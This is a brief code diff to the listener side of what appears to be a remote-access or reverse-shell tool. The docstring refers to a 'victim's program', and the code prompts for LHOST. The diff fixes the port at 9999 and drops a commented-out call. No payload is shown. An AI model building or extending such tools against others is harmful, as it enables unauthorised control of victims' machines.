@@ -117,12 +117,11 @@ def socket_create():
 def main():
     """Function used to set the IP address and port number which should be the same as in the victim's program"""
     global host
+    global port
     try:
         host = input("Enter your local host IP > ")
         print("Set LHOST: %s" % host)
-        global port
-        port = int(input("Enter the port > "))
-        print("Set LPORT: %s" % port)
+        port = 9999
         socket_create()
     except (ValueError, OSError, OverflowError):
         print("You entered invalid data")
@@ -130,5 +129,4 @@ def main():
 
 
 if __name__ == "__main__":
-    # graphic()
     main()
